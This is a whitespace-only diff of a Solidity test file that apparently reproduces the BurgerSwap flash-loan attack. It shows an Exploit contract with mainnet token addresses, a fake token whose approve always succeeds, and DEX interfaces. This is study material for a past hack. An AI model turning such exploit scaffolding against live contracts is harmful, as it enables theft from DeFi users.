@@ -14,6 +14,7 @@ import "forge-std/Test.sol";
 // https://quillhashteam.medium.com/burgerswap-flash-loan-attack-analysis-888b1911daef
 
 contract Exploit is Test {
+
     IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IERC20 private constant BURGER = IERC20(0xAe9269f27437f0fcBC232d39Ec814844a51d6b8f);
 
@@ -90,9 +91,11 @@ contract Exploit is Test {
 
         FAKE.disableExploit();
     }
+
 }
 
 contract FAKE_TOKEN {
+
     uint256 public totalSupply = 100 ether;
     mapping(address => uint256) public balanceOf;
     mapping(address => mapping(address => uint256)) public allowance;
@@ -133,17 +136,21 @@ contract FAKE_TOKEN {
     function approve(address, uint256) external pure returns (bool) {
         return true;
     }
+
 }
 
 /* ---------------------- Interface ---------------------- */
 interface IERC20 {
+
     function transfer(address to, uint256 amount) external returns (bool);
     function approve(address spender, uint256 amount) external returns (bool);
     function balanceOf(address account) external view returns (uint256);
     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+
 }
 
 interface IDemaxPlatform {
+
     function swapExactTokensForTokens(
         uint256 amountIn,
         uint256 amountOutMin,
@@ -159,9 +166,11 @@ interface IDemaxPlatform {
         address to,
         uint256 deadline
     ) external returns (uint256[] memory amounts);
+
 }
 
 interface IDemaxDelegate {
+
     function addLiquidity(
         address tokenA,
         address tokenB,
@@ -171,11 +180,14 @@ interface IDemaxDelegate {
         uint256 amountBMin,
         uint256 deadline
     ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
+
 }
 
 interface IUniswapV2Pair {
+
     function balanceOf(address) external view returns (uint256);
     function skim(address to) external;
     function sync() external;
     function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
+
 }
